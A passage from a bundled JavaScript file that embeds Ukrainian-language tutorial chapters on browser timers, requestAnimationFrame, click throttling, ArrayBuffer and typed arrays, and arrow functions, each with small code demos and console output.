аргументом.\n\n◘◘![ico-25 cap] ** 1**◘◘\n\n~~~js\n(function () {\n  console.log('START')\n\n  setTimeout(() => console.log('One second has passed'), 1000)\n\n  console.log('END')\n})()\n~~~\n\nСпочатку в консолі з'являться повідомлення 'START' та 'END',\nа потім, приблизно через секунду, повідомлення 'One second has passed'.\n\nОднак це не означає, що якщо ви передасте нульове значення методу ~setTimeout~, функція зворотного виклику буде викликана негайно.\n\n◘◘![ico-25 cap] ** 2**◘◘\n\n~~~js\n(function () {\n  console.log('START')\n\n  setTimeout(() => console.log('1'))\n\n  console.log('2')\n\n  setTimeout(() => console.log('3'), 0 )\n\n  console.log('END')\n})()\n~~~\n\n~~~console\nSTART\n2\nEND\nundefined // основний потік завершив роботу, стек викликів порожній.\n1\n3\n~~~\n\n____________________________\n\n## ![ico-25 clock] setInterval\n\nЯ не рекомендую вам використовувати цей таймер.\nПо-перше, тому що точний часовий інтервал витримати неможливо.\n\n^^^[![ico-25 coffee] 3]\n\n~~~js\nfunction showTime () {\n  const demo = document.body\n    .appendChild(document.createElement('h3'))\n  Object.assign(demo, {\n    start: Date.now(),\n    timer: setInterval(() => {\n      demo.innerText = 'Timer for 1000ms: ' + (Date.now() - demo.start)\n      demo.start = Date.now()\n    }, 1000)\n  })\n\n  document.body.onclick = function () {\n    clearInterval(demo.timer)\n    clearInterval(interval)\n  }\n\n  document.body.onmouseover = function () {\n    for (let i = 0; i < 100000; i++) continue\n  }\n}\n\nshowTime()\n\nvar interval = setInterval(() => {\n  for (let i = 0; i < 10000; i++) {\n    document.body.dispatchEvent(new Event('mouseover'))\n  }\n}, 5)\n~~~\n\n^^^\n\n![ico-25 warn] Обов'язково зупиніть таймери, інакше сторінка «зависне».\nЦе, до речі, друга причина, по якій не варто використовувати таймер **~setInterval~**.\n\n{{{Timers-3.js}}}\n\n_________________________________________\n\nІ третя причина, по якій не варто використовувати таймер **~setInterval~** полягає в тому, що частота, з якою браузер перемальовує сторінку, ніколи не буде співпадати з частотою, з якою викликається callback вашого таймера.\n\nТобто callback таймера може спрацьовувати кілька разів, але це буде відображатися на сторінці тільки при наступному перемальовуванні сторінки браузером.\n\nПодивіться, як оновлюється на сторінці значення лічильника, яке збільшується таймером, встановленим на 1 мс:\n\n◘◘![ico-25 cap] ** 4**◘◘\n\n~~~js\nlet counter = 0\n\nconst interval = setInterval(() => counter++, 1)\n~~~\n\n{{{Timers-4.js}}}\n\n___________________________________________\n\nТепер давайте подивимося, як (не треба) анімувати об'єкт на сторінці за допомогою таймера **~setInterval~**.\nОскільки я рекомендую вам віддавати перевагу CSS-анімації скрізь, де це можливо, цей приклад також продемонструє аналогічну анімацію, але з **~@keyframes~**.\n\nДля початку давайте подбаємо про стилізацію елементів, які будуть анімовані:\n\n~~~~js\nconst style = document.head\n  .appendChild(document.createElement('style'))\n\nstyle.textContent = `\n  .animated {\n    position: absolute;\n    width: 136px;\n    height: 48px;\n    padding: 8px;\n  }\n\n  .set-interval {\n    background-color: #f50;\n    top: 16px;\n    left: 16px;\n  }\n\n  .set-interval:before {\n    content: 'setInterval';\n  }\n\n  .css-animation {\n    background-color: #09b;\n    top: 80px;\n    animation: move-to-right 12s forwards linear;\n  }\n\n  .css-animation:before {\n    content: 'CSS animation';\n  }\n\n  .set-interval:before,\n  .css-animation:before {\n    font-family: Arial;\n    font-size: 12px;\n    color: #fff;\n  }\n\n  @keyframes move-to-right {\n    from { left: 16px; }\n    to { left: 416px; }\n  }\n`\n~~~~\n\nі оголосимо функцію, яка створює анімований елемент:\n\n~~~js\nconst createFigure = () => document.body\n  .appendChild(document.createElement('div'))\n~~~\n\nТепер перейдемо до самої анімації.\n\n◘◘![ico-25 cap] ** 5**◘◘\n\n~~~js\nconst makeStep = figure => figure.offsetLeft < 416\n  ? Object.assign(figure.style, {\n      left: figure.offsetLeft + 1 + 'px'\n    })\n  : clearInterval(timer)\n\nconst figure1 = createFigure()\nfigure1.classList.add('animated', 'set-interval')\n\nconst figure2 = createFigure()\nfigure2.classList.add('animated', 'css-animation')\n\nconst timer = setInterval(() => makeStep(figure1), 30)\ndocument.body.onclick = () => clearInterval(timer)\n~~~\n\n{{{Timers-5.js}}}\n\nПам'ятайте, що саме браузер перетворює те, що ви створюєте для користувача, в пікселі, і він виконує свою роботу набагато ефективніше, ніж ваш код.\nCSS-анімація завжди узгоджується з частотою оновлення сторінки.\nВисновок: вам не варто намагатися конкурувати з браузером в тому, в чому він однозначно сильніший за вас.\n\nОднак, якщо вам дійсно потрібно використовувати скрипт для анімації чогось, то браузер надає вам більш надійний інструмент, ніж таймери.\n\nЦе метод объекта window **~requestAnimationFrame~**.\n\n____________________________________________\n\n## ![ico-25 icon] requestAnimationFrame\n\nОтже, є кілька «недоліків» таймерів, які роблять небажаним їх використання для анімації.\nПо-перше, ви ніколи не можете бути впевнені, що час, який пройде до того, як callback таймера потрапить у Call Stack, буде тим, який ви визначили під час встановлення таймера.\nПо-друге, абсолютно нереально звірити частоту перемальовування сторінок браузером з частотою виклику callback таймера.\n\nУ якості аргументу **~requestAnimationFrame~** отримує колбек-функцію, яка буде викликана перед наступною перерисовкою браузером сторінки.\n\n◘◘![ico-25 cap] ** 6**◘◘\n\n~~~js\nlet stop = false\n\nconst showTime = function () {\n  document.body.innerHTML = `<h3>${Date.now()}</h3>`\n  !stop && requestAnimationFrame(showTime)\n}\n\ndocument.body.onclick = () => { stop = true }\n\nshowTime()\n~~~\n\n{{{Timers-6.js}}}\n\n**~requestAnimationFrame~** повертає ціле число, яке є унікальним ідентифікатором (посиланням) для функції зворотного виклику.\n\n~~~js\nconst showTime = function () {\n  document.body.innerHTML = `<h3>${Date.now()}</h3>`\n}\n\nconsole.log(requestAnimationFrame(showTime))\n~~~\n\nБраузери перемальовують сторінку зі швидкістю ~ 60fps (frames per second - кадрів в секунду).\nСаме з цією частотою буде викликатися колбек-функція, що дозволяє уникнути \"дребезгу\" (_debouncing_).\n\nНаступний приклад ілюструє, що **~requestAnimationFrame~**\nзабезпечує більш плавну анімацію, ніж анімація з таймером,\nтому що частота зміни координат об'єкта узгоджується з частотою оновлення (перемальовування) сторінки браузером.\n\nЯк і в прикладі 5, спочатку стилізуємо анімовані елементи:\n\n~~~~js\nconst style = document.head\n  .appendChild(document.createElement('style'))\n\nstyle.textContent = `\n  .animated {\n    position: absolute;\n    width: 136px;\n    height: 48px;\n    padding: 8px;\n  }\n\n  .set-interval {\n    background-color: #f50;\n    top: 16px;\n    left: 16px;\n  }\n\n  .set-interval:before {\n    content: 'setInterval';\n  }\n\n  .request-animation-frame {\n    background-color: #09b;\n    top: 80px;\n  }\n\n  .request-animation-frame:before {\n    content: 'requestAnimationFrame';\n  }\n\n  .set-interval:before,\n  .request-animation-frame:before {\n    font-family: Arial;\n    font-size: 12px;\n    color: #fff;\n  }\n`\n~~~~\n\nДалі ми будемо використовувати функцію **~createFigure~** з того ж прикладу 5.\nА ще ми оголосимо функцію **~makeStep~**:\n\n~~~js\nconst makeStep = figure => figure.style.left = figure.offsetLeft + 1 + 'px'\n~~~\n\n◘◘![ico-25 cap] ** 7**◘◘\n\n~~~js\nlet stopAnimation = false\n\nconst figure1 = createFigure()\nfigure1.classList.add('animated', 'set-interval')\nfigure1.makeStep = makeStep.bind(null, figure1)\n\nconst figure2 = createFigure()\nfigure2.classList.add('animated', 'request-animation-frame')\nfigure2.move = function () {\n  makeStep(this)\n  !stopAnimation && requestAnimationFrame(this.move.bind(this))\n}.bind(figure2)\n\n// Запускаємо анімацію:\n\nconst timer = setInterval(() => figure1.makeStep(), 17)\nfigure2.move()\n~~~\n\n{{{Timers-7.js}}}\n\n______________________________________________\n\n◘◘![ico-25 cap] ** 8**◘◘\n\n~~~js\nconst message = 'Old ECMAScript versions was named by numbers: ES5 and ES6.'\n\nconst demo = document.body\n  .appendChild(document.createElement('h3'))\n\nfunction recurse (message) {\n  const array = message.split('')\n  const char = array.shift()\n\n  if (char) {\n    demo.textContent += char\n    requestAnimationFrame(recurse.bind(null, array.join('')))\n  }\n}\n\nrequestAnimationFrame(recurse.bind(null, message))\n~~~\n\n{{{requestAnimationFrame-5.js}}}\n\n__________________________________________\n\nУ наступному прикладі ми виводитимемо на сторінку масив повідомлень:\n\n~~~js\nconst messages = [\n  'Old ECMAScript versions was named by numbers: ES5 and ES6.',\n  'From 2016, versions are named by year: ES2016, 2018, 2020 ...',\n  'ECMAScript® 2023 Internationalization API Specification',\n  'The 2nd Edition API was adopted by the General Assembly of June 2015, as a complement to the ECMAScript 6th Edition.'\n]\n~~~\n\nЗробимо так, щоб ці повідомлення виводилися на сторінку одночасно, але по одному символу за один раз:\n\n◘◘![ico-25 cap] ** 9**◘◘\n\n~~~js\nfunction recurse (demo, message) {\n  const array = message.split('')\n  const char = array.shift()\n\n  if (char) {\n    demo.textContent += char\n    requestAnimationFrame(recurse.bind(null, demo, array.join('')))\n  }\n}\n\nmessages\n  .forEach(message => {\n    const demo = document.body\n      .appendChild(document.createElement('h3'))\n    requestAnimationFrame(recurse.bind(null, demo, message))\n  })\n~~~\n\n{{{requestAnimationFrame-6.js}}}\n___________________________________________________\n\n## ![ico-25 icon] Debounce\n\nТак званий \"дребезг\" (debounce) – це неприємне явище, яке означає, що якась функція викликається занадто часто.\nНайчастіше таке відбувається з обробниками подій UI.\nОсобливо це погано, якщо код функції надсилає запит на сервер.\nДля обробки такого запиту потрібен час, а нетерплячий користувач може багаторазово натискати на кнопку, не дочекавшись негайної відповіді.\nТак само дребезг може виникати внаслідок технічних причин, наприклад, коли \"залипає\" кнопка мишки або клавіша на клавіатурі.\n\nНаше завдання - не допустити дребезг незалежно від причини його походження, тобто «дроселювати» (throttle) виклики функції, контролюючи їхню частоту.\n\nУ наступному прикладі **~requestAnimationFrame~** використовується для того, щоб під час обробки кліків обмежити їхню частоту до 1 кліка на секунду.\n\nОголосимо допоміжну функцію **~addElem~**, яка дозволить нам наочно відобразити, як \"дросселюються\" кліки: коли клік \"проходить\", то з'являтиметься зафарбований прямокутник, коли клік ігнорується, то прямокутник буде \"порожнім\".\nФункція **~addElem~** додає елемент на сторінку та встановлює його стильову властивість ~background~ у значення, яке передано функції аргументом.\nПри цьому дефолтне значення формального параметра **~back~** буде ~transparent~.\n\n~~~js\nfunction addElem (back = 'transparent') {\n  const elem = section\n    .appendChild(document.createElement('span'))\n  elem.style = `\n    position: relative;\n    display: inline-block;\n    width: 10px;\n    height: 20px;\n    border: dotted 0.1px white;\n    box-sizing: border-box;\n    background: ${back};\n  `\n}\n~~~\n\nТепер можна напиляти сам код \"дросселя\":\n\n◘◘![ico-25 cap] **10**◘◘\n~~~js\nconst section = document.body\n\nsection.timeStamps = []\n\nsection.showClick = function () {\n  const interval = section.timeEnd - section.timeStart\n  const back = interval >= 1000 ? '#09b' : 'transparent'\n\n  addElem(back)\n\n  section.timeStart = interval >= 1000 ? section.timeEnd : section.timeStart\n}\n\nsection.onclick = (function () {\n  section.timeStart = section.timeEnd = new Date().getTime()\n\n  return function (event) {\n    section.timeEnd = new Date().getTime()\n    requestAnimationFrame(section.showClick)\n  }\n})()\n~~~\n\n{{{Timers-10.js}}}\n\n_________________________________________________________\n\n## ![ico-25 icon] Приклади\n\n![ico-25 cap] **11**\n\n~~~~js\nfunction addElem (tagName, container = document.body) {\n  return container\n    .appendChild(document.createElement(tagName))\n}\n\nfunction createAnimated (title, container) {\n  return Object.assign(addElem('div', container), {\n    title,\n    style: `\n      position: absolute;\n      width: ${container.size}px;\n      height: ${container.size}px;\n      background: ${container.randomColor()};\n      top: ${container.randomY()}px;\n      left: ${container.randomX()}px;\n    `,\n    targetY: null,\n    targetX: null,\n    setTarget () {\n      Object.assign(this, {\n        targetY: container.randomY(),\n        targetX: container.randomX()\n      })\n    },\n    resetTarget () {\n      Object.assign(this, { targetX: null, targetY: null })\n    },\n\n    setDistance () {\n      Object.assign(this, {\n        distanceX: this.targetX - parseInt(this.style.left),\n        distanceY: this.targetY - parseInt(this.style.top)\n      })\n    },\n\n    movieClip () {\n      if (container.stop) return\n\n      if (!this.targetY && !this.targetX) this.setTarget()\n      else {\n        this.setDistance()\n        if (!this.distanceY && !this.distanceX) this.resetTarget()\n        else {\n          Object.assign(this.style, {\n            top: parseInt(this.style.top) + Math.sign(this.distanceY) + 'px',\n            left: parseInt(this.style.left) + Math.sign(this.distanceX) + 'px'\n          })\n        }\n      }\n\n      requestAnimationFrame(this.movieClip.bind(this))\n    }\n  })\n}\n\nconst demo = Object.assign(addElem('section'), {\n  size: 40,\n  stop: true,\n  style: `\n    position: absolute;\n    width: 95%;\n    height: 300px;\n    background-color: #000;\n  `,\n  random: (maxVal, minVal = 0) => Math.max(minVal, Math.round(Math.random() * maxVal)),\n  randomX () {\n    return this.random(this.offsetWidth - this.size)\n  },\n  randomY () {\n    return this.random(this.offsetHeight - this.size)\n  },\n  randomColor () {\n    return `rgb(${this.random(255, 100)}, ${this.random(255, 100)}, ${this.random(255, 100)})`\n  }\n})\n\nObject.assign(demo, {\n  elems: [1, 2, 3, 4].map(num => createAnimated(num, demo)),\n\n  onclick: function (event) {\n    this.stop = !this.stop\n    !this.stop &&\n      this.elems.forEach(elem => requestAnimationFrame(elem.movieClip.bind(elem)))\n  }.bind(demo)\n})\n\ndemo.dispatchEvent(new Event('click'))\n~~~~\n\n{{{Timers-requestAnimationFrame.js}}}\n\n___________________________________________________\n\n◘◘![ico-25 cap] **12**◘◘\n\n~~~js\nfunction store () {\n  return Array.from(arguments)\n    .reduce((res, item) => res += item)\n}\n\nconst demo = document.body\n  .appendChild(document.createElement('h3'))\n\ndocument.body.onkeypress = function (event) {\n  store = store.bind(null, parseInt(event.key) || 0)\n  demo.innerText = store()\n}\n\nfunction recurse (num) {\n  if (num > 0) {\n    document.body\n      .dispatchEvent(Object.assign(new Event('keypress'), {\n        key: Math.round(Math.random() * 9)\n      }))\n    requestAnimationFrame(recurse.bind(null, --num))\n  }\n}\n\nrecurse(200)\n~~~\n\n{{{Timers-requestAnimationFrame-1.js}}}\n______________________________________________\n\n![ico-25 cap] **13**\n\n{{{Timers-requestAnimationFrame-2.js}}}\n"},57636:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 study] ArrayBuffer\n\n**конструктор**\n\nСтворює об'єкт з двійковими даними у вигляді рядка.\n\nПрямого доступу до даних в екземплярі ~ArrayBuffer~ немає.\n\nЧитабельною є лише довжина буфера в байтах.\n\n~~~js\nvar buffer  = new ArrayBuffer(16)\nconsole.log(buffer.byteLength)  // 16\n~~~\n\n_________________________________\n\n## ![ico-25 icon] TypedArray\n\n[**MDN**](https://developer.mozilla.org/ru/docs/Web/JavaScript/Guide/Typed_arrays/)\n\nТипізовані масиви мають фіксовану довжину і використовуються для зберігання даних у двійковому форматі (необроблені дані).\nДоступ до даних в типізованих масивах можливий тільки через **представлення**, прямого доступу немає.\n\nДвійкові дані, що зберігаються в типізованому масиві, можуть бути інтерпретовані як рядок, як аудіо- або відеофайл, як зображення або як масив чисел.\nКонструктор **TypedArray** також не доступний безпосередньо, і на нього можна посилатися з ланцюжка успадкування будь-якого екземпляра.\n\n~~~js\nconst buffer = new ArrayBuffer(8)\nconst int16Array = new Int16Array(buffer)\nconst typedArrayPrototype = int16Array.__proto__.__proto__\n\nconsole.log(typedArrayPrototype.constructor.name)\n~~~\n\n••'TypedArray'••\n\n~~~js\nconst excluding = ['buffer', 'byteLength', 'byteOffset', 'length']\n\nObject.getOwnPropertyNames(typedArrayPrototype)\n  .filter(name => !excluding.includes(name))\n  .filter(name => typeof typedArrayPrototype[name] === 'function')\n~~~\n\n~~~~console\n▼ (32) ['constructor', 'entries', 'keys', 'values', 'at', 'copyWithin', 'every', 'fill', 'filter', 'find', 'findIndex', 'findLast', 'findLastIndex', 'forEach', 'includes', 'indexOf', 'join', 'lastIndexOf', 'map', 'reverse', 'reduce', 'reduceRight', 'set', 'slice', 'some', 'sort', 'subarray', 'toReversed', 'toSorted', 'with', 'toLocaleString', 'toString']\n    0: \"constructor\"\n    1: \"entries\"\n    2: \"keys\"\n    3: \"values\"\n    4: \"at\"\n    5: \"copyWithin\"\n    6: \"every\"\n    7: \"fill\"\n    8: \"filter\"\n    9: \"find\"\n    10: \"findIndex\"\n    11: \"findLast\"\n    12: \"findLastIndex\"\n    13: \"forEach\"\n    14: \"includes\"\n    15: \"indexOf\"\n    16: \"join\"\n    17: \"lastIndexOf\"\n    18: \"map\"\n    19: \"reverse\"\n    20: \"reduce\"\n    21: \"reduceRight\"\n    22: \"set\"\n    23: \"slice\"\n    24: \"some\"\n    25: \"sort\"\n    26: \"subarray\"\n    27: \"toReversed\"\n    28: \"toSorted\"\n    29: \"with\"\n    30: \"toLocaleString\"\n    31: \"toString\"\n    length: 32\n  ► [[Prototype]]: Array(0)\n~~~~\n\n_____________________________________\n\n## ![ico-25 icon] Акцесори\n\nДля роботи з даними екземпляра ~ArrayBuffer~ необхідно використовувати конструктори, які створюють екземпляри **аксесорів**.\n\n![ico-20 green-ok] DataView\n![ico-20 green-ok] Int8Array\n![ico-20 green-ok] Uint8Array\n![ico-20 green-ok] Int16Array\n![ico-20 green-ok] Uint16Array\n![ico-20 green-ok] Int32Array\n![ico-20 green-ok] Uint32Array\n\n~~~js\nvar sample = new ArrayBuffer(32)\nnew Uint8Array(sample)\n// ► Uint8Array(32) [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]\nnew Int16Array(sample)\n// ► Int16Array(16) [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]\nnew Uint16Array(sample)\n// ► Uint16Array(16) [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]\nnew Uint32Array(sample)\n// ► Uint32Array(8) [0, 0, 0, 0, 0, 0, 0, 0]\nnew Int32Array(sample)\n// ► Int32Array(8) [0, 0, 0, 0, 0, 0, 0, 0]\n~~~\n\nРезультатом виклику конструкторів ~Int8Array~, ~Uint8Array~, ~Int16Array~, ~Uint16Array~, ~Int32Array~, ~Uint32Array~ буде _ітерабельний об'єкт_ з числовими даними.\n\nДля отримання масиву можна використовувати метод **~ArrayFrom()~**:\n\n~~~js\nvar buffer  = new ArrayBuffer(16)\nvar sample = Array.from(new Uint8Array(buffer))\nsample[0] = 50\nsample[3] = 255\nsample[4] = 178\nconsole.log(sample)\n~~~\n\n**Результат**\n\n•• ► (16) [50, 0, 0, 255, 178, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]••\n\nПроте це \"вулиця в один бік\", оскільки призводить до створення нового масиву **~sample~**, зміни в якому не відображаються на початковому об'єкті **~buffer~**.\n\n______________________________________________\n\n### ![ico-20 icon] DataView\n\nЗа допомогою цього конструктора створюється екземпляр акцесору, що забезпечує гнучкий доступ до даних вихідного екземпляра ~ArrayBuffer~.\n\n~~~js\nvar buffer = new ArrayBuffer(16)\nvar dataView = new DataView(buffer)\nconsole.log(dataView.__proto__)\n~~~\n\n~~~console\n▼ DataView {constructor: ƒ, getInt8: ƒ, …}\n    buffer: (...)\n    byteLength: (...)\n    byteOffset: (...)\n  ► constructor: ƒ DataView()\n  ► getBigInt64: ƒ getBigInt64()\n  ► getBigUint64: ƒ getBigUint64()\n  ► getFloat32: ƒ getFloat32()\n  ► getFloat64: ƒ getFloat64()\n  ► getInt8: ƒ getInt8()\n  ► getInt16: ƒ getInt16()\n  ► getInt32: ƒ getInt32()\n  ► getUint8: ƒ getUint8()\n  ► getUint16: ƒ getUint16()\n  ► getUint32: ƒ getUint32()\n  ► setBigInt64: ƒ setBigInt64()\n  ► setBigUint64: ƒ setBigUint64()\n  ► setFloat32: ƒ setFloat32()\n  ► setFloat64: ƒ setFloat64()\n  ► setInt8: ƒ setInt8()\n  ► setInt16: ƒ setInt16()\n  ► setInt32: ƒ setInt32()\n  ► setUint8: ƒ setUint8()\n  ► setUint16: ƒ setUint16()\n  ► setUint32: ƒ setUint32()\n    Symbol(Symbol.toStringTag): \"DataView\"\n  ► get buffer: ƒ buffer()\n  ► get byteLength: ƒ byteLength()\n  ► get byteOffset: ƒ byteOffset()\n  ► __proto__: Object\n~~~\n\n_________________________________\n\n### ![ico-20 icon] Int16Array\n\n~~~js\nconst buffer = new ArrayBuffer(8)\nconsole.log(new Int16Array(buffer))\n~~~\n\n~~~console\n▼ Int16Array(4) [1280, 9, 8, 0, buffer: ArrayBuffer(8), byteLength: 8, byteOffset: 0, length: 4, Symbol(Symbol.toStringTag): 'Int16Array']\n    0: 0\n    1: 0\n    2: 0\n    3: 0\n  ► buffer: ArrayBuffer(8)\n    byteLength: 8\n    byteOffset: 0\n    length: 4\n    Symbol(Symbol.toStringTag): \"Int16Array\"\n  ► [[Prototype]]: TypedArray\n~~~\n\n~~~js\nconst buffer = new ArrayBuffer(7)\nconsole.log(new Int16Array(buffer))\n~~~\n\n~~~error\n  Uncaught RangeError: byte length of Int16Array should be a multiple of 2\n~~~\n_________________________________________\n\n### ![ico-20 icon] setInt8\n\n~~~js\nvar buffer = new ArrayBuffer(16)\nvar dataView = new DataView(buffer)\ndataView.setInt8(2, 78)\ndataView.setInt8(3, 94)\ndataView.setInt8(5, 55)\nconsole.log(buffer)\n~~~\n\n◘◘**^^Result^^**◘◘\n~~~console\n▼ ArrayBuffer(16) {}\n  ► [[Int8Array]]: Int8Array(16) [0, 0, 78, 94, 0, 55, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]\n  ► [[Int16Array]]: Int16Array(8) [0, 24142, 14080, 0, 0, 0, 0, 0]\n  ► [[Int32Array]]: Int32Array(4) [1582170112, 14080, 0, 0]\n  ► [[Uint8Array]]: Uint8Array(16) [0, 0, 78, 94, 0, 55, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]\n    byteLength: (...)\n  ► __proto__: ArrayBuffer\n~~~\n\n________________________________________\n\n### ![ico-25 icon] setInt16\n\n~~~js\nvar buffer = new ArrayBuffer(16)\nvar dataView = new DataView(buffer)\ndataView.setInt16(1, 78)\ndataView.setInt16(3, 94)\ndataView.setInt16(5, 55)\nconsole.log(buffer)\n~~~\n\n◘◘**^^Result^^**◘◘\n~~~console\n▼ ArrayBuffer(16) {}\n  ► [[Int8Array]]: Int8Array(16) [0, 0, 78, 0, 94, 0, 55, 0, 0, 0, 0, 0, 0, 0, 0, 0]\n  ► [[Int16Array]]: Int16Array(8) [0, 78, 94, 55, 0, 0, 0, 0]\n  ► [[Int32Array]]: Int32Array(4) [5111808, 3604574, 0, 0]\n  ► [[Uint8Array]]: Uint8Array(16) [0, 0, 78, 0, 94, 0, 55, 0, 0, 0, 0, 0, 0, 0, 0, 0]\n    byteLength: (...)\n  ► __proto__: ArrayBuffer\n~~~\n\n________________________________________\n\n### ![ico-25 icon] setInt32\n\n~~~js\nvar buffer = new ArrayBuffer(16)\nvar dataView = new DataView(buffer)\ndataView.setInt16(3, 78)\ndataView.setInt16(7, 94)\ndataView.setInt16(11, 55)\nconsole.log(buffer)\n~~~\n\n◘◘**^^Result^^**◘◘\n~~~console\n▼ ArrayBuffer(16) {}\n  ► [[Int8Array]]: Int8Array(16) [0, 0, 0, 0, 78, 0, 0, 0, 94, 0, 0, 0, 55, 0, 0, 0]\n  ► [[Int16Array]]: Int16Array(8) [0, 0, 78, 0, 94, 0, 55, 0]\n  ► [[Int32Array]]: Int32Array(4) [0, 78, 94, 55]\n  ► [[Uint8Array]]: Uint8Array(16) [0, 0, 0, 0, 78, 0, 0, 0, 94, 0, 0, 0, 55, 0, 0, 0]\n    byteLength: (...)\n  ► __proto__: ArrayBuffer\n~~~\n\n________________________________________\n\n## ![ico-25 icon] Приклади\n\n◘◘![ico-25 cap] ** 1**◘◘\n\n~~~js\nconst picture = document.body\n  .appendChild(document.createElement('img'))\n\nfetch('https://avatars.githubusercontent.com/u/19735284?v=4')\n  .then(response => response.arrayBuffer())\n  .then(response => Object.assign(picture, {\n    src: URL.createObjectURL(new Blob([new Uint8Array(response)]))\n  }))\n~~~\n\n________________________________________\n\n◘◘![ico-25 cap] ** 2**◘◘\n\n~~~js\nconst buffer = new ArrayBuffer(8)\nconst dataView = new DataView(buffer)\n\ndataView.setInt8(1, 5)\ndataView.setInt8(2, 9)\ndataView.setInt8(4, 8)\n\nconsole.log(new Int8Array(buffer))\nconsole.log(new Int16Array(buffer))\n~~~\n\n◘◘**^^Int8Array^^**◘◘\n~~~console\n▼ Int8Array(8) [0, 5, 9, 0, 8, 0, 0, 0, buffer: ArrayBuffer(8), byteLength: 8, byteOffset: 0, length: 8, Symbol(Symbol.toStringTag): 'Int8Array']\n    0: 0\n    1: 5\n    2: 9\n    3: 0\n    4: 8\n    5: 0\n    6: 0\n    7: 0\n  ► buffer: ArrayBuffer(8)\n    byteLength: 8\n    byteOffset: 0\n    length: 8\n    Symbol(Symbol.toStringTag): \"Int8Array\"\n  ► [[Prototype]]: TypedArray\n~~~\n\n◘◘**^^Int16Array^^**◘◘\n~~~console\n▼ Int16Array(4) [1280, 9, 8, 0, buffer: ArrayBuffer(8), byteLength: 8, byteOffset: 0, length: 4, Symbol(Symbol.toStringTag): 'Int16Array']\n    0: 1280\n    1: 9\n    2: 8\n    3: 0\n  ► buffer: ArrayBuffer(8)\n    byteLength: 8\n    byteOffset: 0\n    length: 4\n    Symbol(Symbol.toStringTag): \"Int16Array\"\n  ► [[Prototype]]: TypedArray\n~~~\n\n__________________________________\n\n◘◘![ico-25 cap] ** 3**◘◘\n\n~~~js\nconst buffer = new ArrayBuffer(2000)\n\nconst log = new DataView(buffer)\n\nfunction click (index) {\n  const byteIndex = parseInt(index / 8)\n\n  if (byteIndex > buffer.byteLength - 1) return\n\n  let value = log.getUint8(byteIndex)\n\n  const bitIndex = index % 8\n\n  let binaryValue = value.toString(2).padStart(8, '0')\n\n  binaryValue = binaryValue\n    .split('')\n    .map((char, num) => num === bitIndex ? '1' : char)\n    .join('')\n\n  log.setUint8(byteIndex, parseInt(binaryValue, 2))\n}\n\nconst clicks = [0, 1, 2, 3, 4, 5, 6, 7, 8, 59, 64, 65, 66, 78, 99, 100, 102, 104, 108]\nclicks.forEach(num => click(num))\n\nsetTimeout(() => {\n  const result = Array.from(new Uint8Array(buffer))\n    .map((item, index) => item ? index : null)\n    .filter(index => index !== null)\n    .map(index => ({\n      [index]: log.getUint8(index).toString(2).padStart(8, '0')\n    }))\n  console.log(result.reduce((res, item) => Object.assign(res, item), {}))\n}, 2000)\n~~~\n\n◘◘**^^Result^^**◘◘\n\n~~~console\n▼ {0: '11111111', 1: '10000000', 7: '00010000', 8: '11100000', 9: '00000010', 12: '00011010', 13: '10001000'}\n    0: \"11111111\"\n    1: \"10000000\"\n    7: \"00010000\"\n    8: \"11100000\"\n    9: \"00000010\"\n    12: \"00011010\"\n    13: \"10001000\"\n  ► [[Prototype]]: Object\n~~~\n"},93495:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 study] Стрілкові функції\n\n**ES6**\n\n## ![ico-25 icon] Синтаксис\n\n![ico-20 error] **~function~**\n\nУ сигнатурі стрілкової функції немає слова **~function~**\n\n~~~js\n(параметри) => { тело функції }\n~~~\n\nЗвідси логічно випливає, що при оголошенні стрілочної функції завжди використовується **function expression**:\n\n◘◘![ico-25 cap] ** 1**◘◘\n\n~~~js\nconst multiply = (x, y) => x * y\nmultiply(2, 5) // 10\n~~~\n\n______________________\n\n![ico-20 green-ok] Якщо тіло функції складається з однієї операції, фігурні дужки можна опустити:\n\n~~~js\nconst sayHi = (name = 'user') => console.info(`Hi, ${name}`)\n~~~\n\n![ico-20 green-ok] Якщо функція має тільки один формальний параметр, дужки можна опустити:\n\n~~~js\nconst sayHi = name => console.info(`Hi, ${name}`)\n~~~\n\n![ico-20 green-ok] При відсутності формальних параметрів круглі дужки обов'язкові:\n\n~~~js\nconst sayHi = () => console.info('Hi, user')\n~~~\n\n________________________________________\n\n![ico-20 green-ok] Стрілка **~=>~** у стрілочній функції є оператором **~return~**. Тому за відсутності фігурних дужок, якщо тіло функції складається з одного виразу, значення якого повертає функція, оператор **~return~** не використовується:\n\n◘◘![ico-25 cap] ** 2**◘◘\n\n~~~js\n// звичайна функція\nconst multiply = function (x, y) { return x * y }\n\n// стрілкова функція\nconst multiply = (x, y) => x * y\n~~~\n\n_________________________________\n\n![ico-20 green-ok] Оператори гілкування коду (окрім тернарного оператора) та оператори циклу потрібно брати в фігурні дужки.\n\n◘◘![ico-25 cap] оператор _for_◘◘\n\n~~~js\nconst iterate = len => {\n  for (let i = 1; i <= len; i++) console.log(i)\n}\n~~~\n\nІ тут ми можемо переконатися в перевагах ітеруючих методів масивів:\n\n~~~js\nconst iterate = len => new Array(len).fill(0).forEach((item, index) => console.log(index + 1))\n~~~\n\n◘◘![ico-25 cap] оператор _switch_◘◘\n\n~~~js\nconst getAnswer = question => {\n  switch (question) {\n    case 'who':\n      return 'student'\n    case 'what':\n      return 'develop'\n    case 'where':\n      return 'Kharkiv'\n    default:\n      return 'I don\\'t undestand your question'\n  }\n}\n~~~\n\n◘◘![ico-25 cap] тернарний оператор◘◘\n\n~~~js\nvar answerArrow = question =>  \n  question === 'who'\n    ? 'Irina'\n    : question === 'what'\n      ? 'develop'\n      : question === 'where'\n        ? 'Kharkiv'\n        : 'I don\\'t undestand your question'\n~~~\n\nАбо так:\n\n~~~js\nconst getAnswer = question => ['who', 'what', 'where'].includes(question)\n  ? ['Irina', 'develop', 'Kharkiv'][['who', 'what', 'where'].indexOf(question)]\n  : 'I don\\'t undestand your question'\n~~~\n\nАбо так, 